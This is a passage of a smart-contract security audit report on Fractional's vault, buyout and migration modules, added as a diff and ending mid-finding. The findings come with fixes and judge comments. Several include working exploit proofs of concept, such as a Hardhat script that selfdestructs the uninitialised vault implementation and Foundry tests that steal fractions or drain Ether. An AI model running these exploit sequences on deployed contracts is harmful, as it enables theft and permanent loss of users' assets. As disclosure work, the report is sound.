@@ -1,0 +1,470 @@
+[H-01] Vault implementation can be destroyed leading to loss of all assets
+Submitted by 0xA5DF, also found by 242, 0x, 0xsanson, Critical, sorrynotsorry, unforgiven, and zzzitron
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L19-L22
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L11-L25
+Vulnerability Details
+This is a basic uninitialized proxy bug, theVaultFactorycreates a single implementation ofVaultand then creates a proxy to that implementation every time a new vault needs to be deployed.
+The problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via theexecutefunction) to a function with theselfdestructopcode.
+Once the implementation is destroyed all of the vaults will be unusable. And since there’s no logic in the proxies to update the implementation - that means this is permanent (i.e. there’s no way to call any function on any vault anymore, they’re simply dead).
+Impact
+This is a critical bug, since ALL assets held by ALL vaults will be lost. There’s no way to transfer them out and there’s no way to run any function on any vault.
+Also, there’s no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there’s no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).
+Proof of Concept
+I created the PoC based on thescripts/deploy.jsfile, here’s a stripped-down version of that:
+const{ethers} =require("hardhat");constZERO_ADDRESS="0x0000000000000000000000000000000000000000";asyncfunctionmain() {const[deployer,attacker] =awaitethers.getSigners();// Get all contract factoriesconstBaseVault=awaitethers.getContractFactory("BaseVault");constSupply=awaitethers.getContractFactory("Supply");constVaultRegistry=awaitethers.getContractFactory("VaultRegistry");// Deploy contractsconstregistry=awaitVaultRegistry.deploy();awaitregistry.deployed();constsupply=awaitSupply.deploy(registry.address);awaitsupply.deployed();// notice that the `factory` var in the original `deploy.js` file is a different factory than the registry'sconstregistryVaultFactory=awaitethers.getContractAt("VaultFactory",awaitregistry.factory());constimplVaultAddress=awaitregistryVaultFactory.implementation();constvaultImpl=awaitethers.getContractAt("Vault",implVaultAddress);constbaseVault=awaitBaseVault.deploy(registry.address,supply.address);awaitbaseVault.deployed();// proxy vault - the vault that's used by the userletproxyVault=awaitdeployVault(baseVault,registry,attacker);constdestructorFactory=awaitethers.getContractFactory("Destructor");constdestructor=awaitdestructorFactory.deploy();letdestructData=destructor.interface.encodeFunctionData("destruct", [attacker.address]);constabi=newethers.utils.AbiCoder();constleafData=abi.encode(["address","address","bytes4"],[attacker.address,destructor.address,destructor.interface.getSighash("destruct")]);constleafHash=ethers.utils.keccak256(leafData);awaitvaultImpl.connect(attacker).init();awaitvaultImpl.connect(attacker).setMerkleRoot(leafHash);// we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in caseawaitvaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);// before: everything is fineletimplVaultCode=awaitethers.provider.getCode(implVaultAddress);console.log("Impl Vault code size before:",implVaultCode.length-2);// -2 for the 0x prefixletowner=awaitproxyVault.owner();console.log("Proxy Vault works fine, owner is: ",owner);awaitvaultImpl.connect(attacker).execute(destructor.address,destructData, []);// after: vault implementation is destructedimplVaultCode=awaitethers.provider.getCode(implVaultAddress);console.log("\nVault code size after:",implVaultCode.length-2);// -2 for the 0x prefixtry{owner=awaitproxyVault.owner();}catch(e) {console.log("Proxy Vault isn't working anymore.",e.toString().substring(0,300));}}asyncfunctiondeployVault(baseVault,registry,attacker) {constnodes=awaitbaseVault.getLeafNodes();consttx=awaitregistry.connect(attacker).create(nodes[0], [], []);constreceipt=awaittx.wait();constvaultEvent=receipt.events.find(e=>e.address==registry.address);constnewVaultAddress=vaultEvent.args._vault;constnewVault=awaitethers.getContractAt("Vault",newVaultAddress);returnnewVault;}if(require.main===module) {main()}
+Destructor.solfile:
+// SPDX-License-Identifier: MITpragmasolidity0.8.13;contractDestructor{functiondestruct(addresspayabledst)public{selfdestruct(dst);}}
+Output:
+Impl Vault code size before: 10386Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3Vault code size after: 0Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method="owner()", data="0x", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2)
+Sidenote: as the comment in the code says, we don’t really need to transfer the ownership to the zero address.
+It’s just that Foundry’sforgedid revert the destruction when I didn’t do it, with the error ofOwnerChanged(i.e. once theselfdestructwas called the owner became the zero address, which is different than the original owner) so I decided to add this just in case.
+This is probably a bug inforge, since the contract shouldn’t destruct till the end of the tx (Hardhat indeed didn’t revert the destruction even when the attacker was the owner).
+Tools Used
+Hardhat
+Recommended Mitigation Steps
+Add init inVault’s constructor (and make theinitfunctionpublicinstead ofexternal):
+contractVaultisIVault,NFTReceiver{/// @notice Address of vault owneraddresspublicowner;/// ...constructor(){// initialize implementationinit();}/// @dev Initializes nonce and proxy ownerfunctioninit()public{
+Alternately you can add init inVaultFactory.solconstructor, but I think initializing in the contract itself is a better practice.
+/// @notice Initializes implementation contractconstructor() {implementation=address(newVault());Vault(implementation).init();}
+After mitigation the PoC will output this:
+Error: VM Exception while processing transaction: reverted with custom error 'Initialized("0xa16E02E87b7454126E5E10d957A927A7F5B5d2be", "0x70997970C51812dc3A010C7d01b50e0d17dc79C8", 1)'at Vault._execute (src/Vault.sol:124)at Vault.init (src/Vault.sol:24)at HardhatNode._mineBlockWithPendingTxs....
+stevennevins (Fractional) confirmed and commented:
+Acknowledging the severity of this and will fix it. Thank you for reporting @0xA5DF.
+HardlyDifficult (judge) commented:
+Agree this is High risk. If this had gone unnoticed for a period of time, then later self destructing the implementation contract would brick all vaults and lose funds for potentially many users.
+
+[H-02] Forced buyouts can be performed by malicious buyers
+Submitted by cccz
+In the end function of the Buyout contract, when the buyout fails, ERC1155 tokens are sent to the proposer. A malicious proposer can start a buyout using a contract that cannot receive ERC1155 tokens, and if the buyout fails, the end function fails because it cannot send ERC1155 tokens to the proposer. This prevents a new buyout from being started.
+Proof of Concept
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238
+Recommended Mitigation Steps
+Consider saving the status of the proposer after a failed buyout and implementing functions to allow the proposer to withdraw the ERC1155 tokens and eth.
+Ferret-san (Fractional) confirmed
+HardlyDifficult (judge) commented:
+The 1155 receiver can prevent a failed buyout from ending, which prevents a new one from starting. Agree with severity.
+
+[H-03] Migration: no check that user-suppliedproposalIdandvaultmatch
+Submitted by kenzo, also found by 0x1f8b, bin2chen, codexploder, dipp, minhtrng, and smiling_heretic
+https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L111
+https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L124
+https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L143
+https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L157
+https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L164
+Vulnerability Details
+In Migration, when joining or leaving a migration proposal, Fractional does not check whether the user suppliedproposalIdandvaultmatch the actual vault that the proposal belongs to.
+This allows the user to trick the accounting.
+Impact
+Loss of funds for users.
+Malicious users can withdraw tokens from proposals which have not been committed yet.
+Proof of Concept
+Let’s say Vault A’s FERC1155 token is called TOKEN.
+Alice has deposited 100 TOKEN in Migration to Vault A on proposal ID 1.
+Now Malaclypse creates Vault B with token ERIS as FERC1155 and mints 100 tokens to himself.
+He then calls Migration’sjoinwith amount as 100, Vault B asvault, proposal ID as 1.
+The functionwill getERIS as the token to deposit.
+Itwill pullthe ERIS from Mal.
+And now for the problem - itwill setthe following variable:
+userProposalFractions[_proposalId][msg.sender] += _amount;
+Notice that this does not correspond to the vault number.
+Now, Mal will call theleavefunction, this time with Vault A address and proposal ID 1.
+The functionwill getthe token to send from the vault as TOKEN.
+Itwill getthe amount to withdraw fromuserProposalFractions[_proposalId][msg.sender], which as we saw previously will be 100.
+It willdeductthis amount frommigrationInfo[_vault][_proposalId], which won’t revert as Alice deposited 100 to this vault and proposal.
+And finallyit will send100 TOKENs to Mal - although he deposited ERIS.
+Mal received Alice’s valuable tokens.
+Recommended Mitigation Steps
+I think that one option would be to save for each proposal which vault it corresponds to.
+Then you can verify that user supplies a matching vault-proposal pair, or he can even just supply proposal and the contract will get the vault from that.
+Another solution would be to haveuserProposalFractionssave the relevant vault also, not just a general proposal id.
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+The warden’s POC shows how an attacker can effectively steal tokens by creating a migration for a new vault with worthless tokens and reusing an existingproposalId, then withdrawing valuable tokens from the original proposal. I agree this is a High risk issue.
+
+[H-04] Division rounding can make fraction-price lower than intended (down to zero)
+Submitted by 0xA5DF, also found by 0x52, exd0tpy, horsefacts, hyh, kenzo, Lambda, minhquanym, panprog, scaraven, shenwilly, and simon135
+Divisions in EVM are rounded down, which means when the fraction price is close to 1 (e.g. 0.999) it would effectively be zero, when it’s close to 2 (1.999) it would be rounded to 1 - losing close to 50% of the intended price.
+In case the proposer had any fractions, the buyout module puts them for sale and he can lose his fractions while getting in exchange either zero or a significantly lower price than intendedEven when the proposer doesn’t hold any fractions, if the buyout succeeds - the difference (i.e.buyoutPrice - fractionPrice*totalSupply) goes to those who cash out their fractions after the buyout ends.That’s going to disincentivize users to sell their fractions during the buyout, because they may get more if they keep it till the buyout ends.In other words, not only that the extra money the proposer paid doesn’t increase the chance of the buyout to succeed, it actually decreases it.
+Proof of Concept
+I’ve added the following tests totest/Buyout.t.sol.
+// add Eve to the list of usersfunctionsetUp()public{setUpContract();alice=setUpUser(111,1);bob=setUpUser(222,2);eve=setUpUser(333,3);vm.label(address(this),"BuyoutTest");vm.label(alice.addr,"Alice");vm.label(bob.addr,"Bob");vm.label(eve.addr,"Eve");}///////////////////////////////////// a scenario where the price is zero, and the proposer ends up loosing all his fractionsfunctiontest_bugFractionPriceIsZero()public{uinttotalSupply=21e17;uintBOB_INITIAL_BALANCE=totalSupply/2;initializeBuyout(alice,bob,totalSupply,BOB_INITIAL_BALANCE,true);// Bob starts a buyout with 1 ether for the other half of total fractionsbob.buyoutModule.start{value:1ether}(vault);eve.buyoutModule.buyFractions{value:0}(vault,BOB_INITIAL_BALANCE);// Eve got all Bob's fractions for the very tempting price of 0assertEq(getFractionBalance(eve.addr),BOB_INITIAL_BALANCE);}////////////////////////////////// a scenario where the price is 1, and the fraction price ends up being// 50% of intended price.// The user who cashes his fractions after the sale gets the difference (0.9 ether in this case).functiontest_bugFractionPriceIsOne()public{uinttotalSupply=11e17;uintBOB_INITIAL_BALANCE=totalSupply/10;initializeBuyout(alice,bob,totalSupply,BOB_INITIAL_BALANCE,true);uintaliceFractionBalance=totalSupply*9/10;uint256buyoutPrice=2ether;uint256fractionPrice=buyoutPrice/totalSupply;assertEq(fractionPrice,1);// We need to approve the buyout even though Eve doesn't hold any fractionseve.ferc1155=newFERC1155BS(address(0),333,token);setApproval(eve,buyout,true);eve.buyoutModule.start{value:buyoutPrice}(vault);// alice selling all her fractionsalice.buyoutModule.sellFractions(vault,aliceFractionBalance);// 4 days till buyout endsvm.warp(block.timestamp+4.1days);bob.buyoutModule.end(vault,burnProof);bob.buyoutModule.cash(vault,burnProof);// Alice revenue should be about 0.99 etheruint256aliceExpectedETHRevenue=fractionPrice*aliceFractionBalance;// Bob revenue should be about 1.01 etheruint256bobExpectedETHRevenue=buyoutPrice-aliceExpectedETHRevenue;// Bob earned more than Alice even though Alice had 9 times his fractions// This means Bob got ~9 times ETH per fraction than AliceassertTrue(bobExpectedETHRevenue>aliceExpectedETHRevenue);// Just make sure they have the expected balanceassertEq(getETHBalance(alice.addr),aliceExpectedETHRevenue+INITIAL_BALANCE);assertEq(getETHBalance(bob.addr),bobExpectedETHRevenue+INITIAL_BALANCE);}
+Tools Used
+Foundry
+Recommended Mitigation Steps
+Solution A: make surebuyoutPrice = fractionPrice * totalSupply
+Request the user to send the intended fraction price (as a function arg) and then make sure he sent enough ETH. This way the user is well aware of the fraction price.An advantage of this method is that the buyout price calculation is also more accurate (compared to(msg.value * 100) /(100 - ((depositAmount * 100) / totalSupply))which has a rounding of up to 1%)Optional - you can also refund the user if he sent too much ETH, though this is probably unnecessary since the UI should calculate the exact amount the user should send.
+Proposed code for solution A:
+/// @param _vault Address of the vault-    function start(address _vault) external payable {+    function start(address _vault, uint256 _fractionPrice) external payable {// Reverts if ether deposit amount is zeroif (msg.value == 0) revert ZeroDeposit();// Reverts if address is not a registered vault@@ -66,6 +66,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {(, , State current, , , ) = this.buyoutInfo(_vault);State required = State.INACTIVE;if (current != required) revert InvalidState(required, current);+        if (fractionPrice == 0) revert ZeroFractionPrice();@@ -83,9 +84,10 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {// Calculates price of buyout and fractions// @dev Reverts with division error if called with total supply of tokens-        uint256 buyoutPrice = (msg.value * 100) /-            (100 - ((depositAmount * 100) / totalSupply));-        uint256 fractionPrice = buyoutPrice / totalSupply;+        uint256 fractionPrice = _fractionPrice;+        uint256 buyoutPrice = fractionPrice * totalSupply;+        uint256 requiredEth = fractionPrice * (totalSupply - depositAmount);+        if (msg.value != requiredEth) revert InvalidPayment();// Sets info mapping of the vault address to auction struct
+Solution B: Calculate the price at buy/sell time usingbuyoutPrice
+The problem with solution A is that it doesn’t let much flexibility in case that total supply is large. In the example in the PoC (totalSupply = 2.1e18) the buyout price can be either 2.1 ETH or 4.2 ETH, if the user wants to offer 1.5 ETH or 3 ETH he can’t do it.This solution solves this - instead of basing the buy/sell price on the fraction price - use the buyout price to calculate the buy/sell price.This would cause a slight differential price (buying 1K fractions would have a slightly different price than 1M fractions).However, note that the rounding here is probably insignificant, since the rounding would be no more than 1 wei per buy/sellAlso, the more the users buy/sell the more accurate the price would be (the less you buy the more you’ll pay, the less you sell the less you’d get).For selling just calculateprice = (buyoutPrice * amount) / totalSupplyFor buying do the same, just add 1 wei if there was any rounding (see code below)If you’re worried about the rounding of the buyout price (compared to solution A), you can increase the coefficient (this doesn’t cost any extra gas, and is nearly impossible to overflow):
+(ethDeposit * 1e6) / (1e6 - ((fractionDeposit * 1e6) / totalSupply))
+Proposed code for solution B:
+--- a/src/interfaces/IBuyout.sol+++ b/src/interfaces/IBuyout.sol@@ -20,7 +20,7 @@ struct Auction {// Enum state of the buyout auctionState state;// Price of fractional tokens-    uint256 fractionPrice;+    uint256 buyoutPrice;// Balance of ether in buyout pooluint256 ethBalance;// Total supply recorded before a buyout started--- a/src/modules/Buyout.sol+++ b/src/modules/Buyout.sol@@ -85,14 +85,14 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {// @dev Reverts with division error if called with total supply of tokensuint256 buyoutPrice = (msg.value * 100) /(100 - ((depositAmount * 100) / totalSupply));-        uint256 fractionPrice = buyoutPrice / totalSupply;+        uint256 estimatedFractionPrice = buyoutPrice / totalSupply;// Sets info mapping of the vault address to auction structbuyoutInfo[_vault] = Auction(block.timestamp,msg.sender,State.LIVE,-            fractionPrice,+ // replace fraction price with buyout price in the Auction struct+            buyoutPrice,msg.value,totalSupply);@@ -102,7 +102,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {msg.sender,block.timestamp,buyoutPrice,-            fractionPrice+            estimatedFractionPrice);}@@ -115,7 +115,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {_vault);if (id == 0) revert NotVault(_vault);-        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this+        (uint256 startTime, , State current, uint256 buyoutPrice, , uint256 totalSupply ) = this.buyoutInfo(_vault);// Reverts if auction state is not liveState required = State.LIVE;@@ -135,7 +135,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {);// Updates ether balance of pool-        uint256 ethAmount = fractionPrice * _amount;+        uint256 ethAmount = buyoutPrice * _amount / totalSupply;buyoutInfo[_vault].ethBalance -= ethAmount;// Transfers ether amount to caller_sendEthOrWeth(msg.sender, ethAmount);@@ -153,7 +153,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {);if (id == 0) revert NotVault(_vault);// Reverts if auction state is not live-        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this+        (uint256 startTime, , State current, uint256 buyoutPrice, , uint256 totalSupply ) = this.buyoutInfo(_vault);State required = State.LIVE;if (current != required) revert InvalidState(required, current);@@ -161,8 +161,13 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {uint256 endTime = startTime + REJECTION_PERIOD;if (block.timestamp > endTime)revert TimeExpired(block.timestamp, endTime);++        uint256 price = (buyoutPrice * _amount) / totalSupply;+        if (price * totalSupply < buyoutPrice * _amount){+            price++;+        }// Reverts if payment amount does not equal price of fractional amount-        if (msg.value != fractionPrice * _amount) revert InvalidPayment();+        if (msg.value != price) revert InvalidPayment();// Transfers fractional tokens to callerIERC1155(token).safeTransferFrom(
+HardlyDifficult (judge) increased severity to High and commented:
+Rounding impactingfractionPricecan significantly impact other math in this module. I think this is a High risk issue, given the right circumstances such as the example above where the buy price becomes zero, assets are compromised.Selecting this instance as the primary issue for including test code and the detailed recs.
+
+[H-05] Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back
+Submitted by kenzo, also found by 0x52, ElKu, hansfriese, hyh, and panprog
+https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308
+https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L321
+https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L312
+https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L325
+Vulnerability Details
+When a user callswithdrawContribution, it will try to send him back his original contribution for the proposal.
+But if the proposal has been committed, and other users have interacted with the buyout, Migration will receive back a different amount of ETH and tokens.
+Therefore it shouldn’t send the user back his original contribution, but should send whatever his share is of whatever was received back from Buyout.
+Impact
+Loss of funds for users.
+Some users might not be able to withdraw their contribution at all,
+and other users might withdraw funds that belong to other users. (This can also be done as a purposeful attack.)
+Proof of Concept
+A summary is described at the top.
+It’s probably not needed, but here’s the flow in detail.
+When a user joins a proposal, Migrationsaveshis contribution:
+userProposalEth[_proposalId][msg.sender] += msg.value;userProposalFractions[_proposalId][msg.sender] += _amount;
+Later when the user would want to withdraw his contribution from a failed migration, Migration wouldreferto these same variables to decide how much to send to the user:
+uint256 userFractions = userProposalFractions[_proposalId][msg.sender];IFERC1155(token).safeTransferFrom(address(this), msg.sender, id, userFractions, "");uint256 userEth = userProposalEth[_proposalId][msg.sender];payable(msg.sender).transfer(userEth);
+But if the proposal was committed, and other users interacted with the buyout, then the amount of ETH and tokens that Buyout sends back is not the same contribution.
+For example, if another user calledbuyFractionsfor the buyout, itwill decreasethe amount of tokens in the pool:
+IERC1155(token).safeTransferFrom(address(this), msg.sender, id, _amount, "");
+And when the proposal will end, if it has failed, Buyout willsend backto Migrationthe amountof tokens in the pool:
+uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);...IERC1155(token).safeTransferFrom(address(this), proposer, id, tokenBalance, "");
+(**Same will happen for the ETH amount)
+Therefore, Migration will receive back less tokens than the original contribution.
+When the user will try to callwithdrawContributionto withdraw his contribution from the pool, Migration wouldtry to sendthe user’s original contribution.
+But there’s a deficit of that.
+If other users have contributed the same token, then it will transfer their tokens to the user.
+If not, then the withdrawal will simply revert for insufficient balance.
+Recommended Mitigation Steps
+I am not sure, but I think that the correct solution would be that upon a failed proposal’s end, there should be a hook call from Buyout to the proposer - in our situation, Migration.
+Migration would then see(/receive as parameter) how much ETH/tokens were received, and update the proposal with the change needed. eg. send to each user 0.5 his tokens and 1.5 his ETH.
+In another issue I submitted, “User can’t withdraw assets from failed migration if another buyout is going on/succeeded”, I described for a different reason why such a callback to Migration might be needed. Please see there for more implementation suggestions.
+I think this issue shows that indeed it is needed.
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+After an unsuccessful migration, some users will be unable to recover their funds due to a deficit in the contract. Agree this is a High risk issue.
+
+[H-06] Any fractions deposited into any proposal can be stolen at any time until it is commited
+Submitted by panprog, also found by 0x52, 0xsanson, hansfriese, shenwilly, and zzzitron
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L210
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L73
+Impact
+When buyout starts, it takes all fractions owned by proposer. This means that whenMigrationcontract starts a buyout, it takes all fractions it has, not just the fractions from the proposal. This is easily exploitable by anyone.
+Stealing fractions scenario:
+Bob starts a proposal, deposits3000fractionsAlice immediately starts another proposal withtargetPrice = 0, deposits0 fractionsand minimal ether (value: 1, which is10^-18 ether)Since price is larger than targetPrice, Alice immediately commits the proposalBuyout is started, but instead of0 fractionsit has3000 fractionsfrom bob, because starting buyout took allMigration’s fractions.Alice immediately buys3000 fractionsfrom buyout for free (0 ether).At this point Alice has successfully stolen all deposited fractions.
+Proof of Concept
+Add this code to test/Migration.t.sol
+function testPanprogBugH4() public {initializeMigration(alice, bob, 10000, 10000, true);(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();// Migrate to a vault with no permissions (just to test out migration)address[] memory newModules = new address[](2);newModules[0] = migration;newModules[1] = modules[1];// Bob makes the proposalbob.migrationModule.propose(vault,newModules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 2,10 ether);// Bob joins the proposal with 3000 fractionsbob.migrationModule.join{value: 1 ether}(vault, 1, 3000);// Alice starts a competing proposal (we use bob's data for simplicity)alice.migrationModule.propose(vault,newModules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 10,0 ether);// Alice joins her proposal with 0 fractions and minimum allowed ether (for the price to be above target)alice.migrationModule.join{value: 1}(vault, 2, 0);// since the target price is reached, alice starts the buyout on her proposalalice.migrationModule.commit(vault, 2);// at this point buyout should be empty, but in fact due to bug it has 3000 fractions from bob// alice can now buy fractions from buyout for free (it should revert, but it doesn't)vm.expectRevert(abi.encodeWithSelector(IBuyout.InvalidPayment.selector));alice.buyoutModule.buyFractions(vault, 3000);}
+Recommended Mitigation Steps
+Buyoutstartfunction should include amount of fractions a proposer deposits, andMigration’scommitfunction should specify correct fractions amount when starting a buyout.
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+An attacker can steal fractions that have that have been used to join a migration. Agree this is a High risk issue.Making this submission the primary instance for including a coded POC.
+
+[H-07] Proposer canstarta perpetual buyout which can onlyendif the auction succeeds and is not rejected
+Submitted by sseefried, also found by TrungOre
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L39
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L66-L68
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L235
+Impact
+A user can start a perpetual buyout that cannot be stopped except by making the buyout succeed. This can be done by creating a malicious contract that will call back tostartwhen it receives ETH via itsreceivefunction. The user then starts the perpetual buyout by callingstartfrom the malicious contract.
+Assume the rejection period has passed and the auction pool is not large enough (i.e. < 50%). Ifendis called then the method_sendEthOrWethwill attempt to send ETH to the malicious contract. The contract will simply call back tostartsending the ETH it has just received.
+The impact is thatendcan never be called on this buyout proposal if the buyout auction has failed. Worse, no new buyout proposal can be made since the current one is still live, and it is never in a state where it is not live.
+The others users will either need to accept that assets are locked inside the vault, or that they will need tosellFractionsin order to make the buyout succeed.
+Proof of Concept
+Each vault can only have onebuyoutInfoassociated with it as can be seen online 39.A new buyout proposal cannot be made unless thebuyoutInfostate isState.INACTIVEas can be seen inlines 66-68A proposer makes a proposal by callingstart. They do this from a smart contract that simply callsstartagain when itsreceivefunction is called.If the proposer fails to get over 50% then, whenendis called,_sendEthOrWethis called using theproposervalue which is the smart contract that re-enters. Seeline 235._sendETHOrWethis cleverly written so that ifreceivewere to revert the reversion would not “bubble up”. However, it does not protect against re-entrancy.This means thatbuyoutInfo[vault]can never be overwritten. It is permanently stuck in stateState.LIVEmeaning thatstartcan never be called forvaultby anyone else.The only way out of this conundrum is for the other users of the vault tosellFractionsto make the auction succeed or to accept that assets are locked in the vault forever.
+Afoundry testexhibiting this attack has been written in a private fork of the contest repo.
+Note thatonERC1155Receivedneeds to be implemented in the malicious contract.
+Tools Used
+Manual inspection + Foundry
+Recommended Mitigation Steps
+Prevent re-entrancy in thestartfunction by using thenonReentrantmodifier provided by OpenZeppelin’sReentrancyGuardcontract, or use an equivalent custom solution.
+aklatham (Fractional) marked as duplicate and commented:
+Duplicate of#87
+sseefried (warden) commented:
+This exploit is a duplicate of the others in most respects but there is one key difference. In the other submissions there is at least a chance that someone else will get intheirbuyout bid after 4 days by carefully submitting a transaction at just the right moment. With the exploit I have outlined they cannot even do this. The call toendwill automatically create a new buyout with no chance of anyone else ever getting their transaction in. It is a truly perpetual buyout.To see an executable PoC of this (using a malicious contract to ensure the perpetual buyout)  apply the diff in thisgistand run$ forge test -m testPerpetualBuyoutBug
+stevennevins (Fractional) commented:
+Thanks for the reply @sseefried! We felt this was the same underlying issue as #87 and others labeled as duplicates while having a more certain path to griefing.
+HardlyDifficult (judge) commented:
+Starting a buyout can result in assets being stuck in a contract. This submission shows how reentrancy can be used to make this even worse resulting in locking the assets up forever. This combination of concerns raises the issue to High risk.Selecting this submission as the primary for identifying this potential impact and including a coded POC.
+
+[H-08] Cash-out from a successful buyout allows an attacker to drain Ether from theBuyoutcontract
+Submitted by berndartmueller, also found by 0xA5DF, 0xsanson, 0xSky, cccz, cryptphi, ElKu, hansfriese, jonatascm, kenzo, Kumpa, minhquanym, s3cunda, shenwilly, smiling_heretic, Treasure-Seeker, TrungOre, and zzzitron
+The functionBuyout.cashallows a user to cash out proceeds (Ether) from a successful vault buyout.
+However, due to howbuyoutShareis calculated inBuyout.cash, users (fractional vault token holders) cashing out would receive more Ether than they are entitled to. The calculation is wrong as it uses the initial Ether balance stored inbuyoutInfo[_vault].ethBalance. Each consecutive cash-out will lead to a user receiving more Ether, ultimately draining the Ether funds of theBuyoutcontract.
+Proof of Concept
+Copy paste the following test case intoBuyout.t.soland run the test viaforge test -vvv --match-test testCashDrainEther:
+The test shows how 2 users Alice and Eve cash out Ether from a successful vault buyout (which brought in10 ether). Alice and Eve are both entitled to receive5 ethereach. Alice receives the correct amount when cashing out, however, due to a miscalculation ofbuyoutShare(see#L268-L269), Eve can cash-out10 etherfrom theBuyoutcontract.
+functiontestCashDrainEther()public{/// ==================/// ===== SETUP =====/// ==================deployBaseVault(alice,TOTAL_SUPPLY);(token,tokenId) =registry.vaultToToken(vault);alice.ferc1155=newFERC1155BS(address(0),111,token);bob.ferc1155=newFERC1155BS(address(0),222,token);eve.ferc1155=newFERC1155BS(address(0),333,token);buyout=address(buyoutModule);proposalPeriod=buyoutModule.PROPOSAL_PERIOD();rejectionPeriod=buyoutModule.REJECTION_PERIOD();vm.label(vault,"VaultProxy");vm.label(token,"Token");setApproval(alice,vault,true);setApproval(alice,buyout,true);setApproval(bob,vault,true);setApproval(bob,buyout,true);setApproval(eve,vault,true);setApproval(eve,buyout,true);alice.ferc1155.safeTransferFrom(alice.addr,bob.addr,1,6000,"");alice.ferc1155.safeTransferFrom(alice.addr,eve.addr,1,2000,"");/// ==================/// ===== SETUP END =====/// ==================/// Fraction balances:assertEq(getFractionBalance(alice.addr),2000);// Alice: 2000assertEq(getFractionBalance(bob.addr),6000);// Bob: 6000assertEq(getFractionBalance(eve.addr),2000);// Eve: 2000bob.buyoutModule.start{value:10ether}(vault);assertEq(getETHBalance(buyout),10ether);/// Bob (proposer of buyout) transfered his fractions to buyout contractassertEq(getFractionBalance(buyout),6000);vm.warp(rejectionPeriod+1);bob.buyoutModule.end(vault,burnProof);/// Fraction balances after buyout ended:assertEq(getFractionBalance(alice.addr),2000);// Alice: 2000assertEq(getFractionBalance(bob.addr),0);// Bob: 0assertEq(getFractionBalance(eve.addr),2000);// Eve: 2000assertEq(getETHBalance(buyout),10ether);/// Alice cashes out 2000 fractions -> 5 ETH (correct amount)alice.buyoutModule.cash(vault,burnProof);assertEq(getFractionBalance(alice.addr),0);assertEq(getETHBalance(alice.addr),105ether);/// Eve cashes out 2000 fractions -> REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETHeve.buyoutModule.cash(vault,burnProof);}
+Additionallyto the demonstrated PoC in the test case, an attacker could intentionally create vaults with many wallets and exploit the vulnerability:
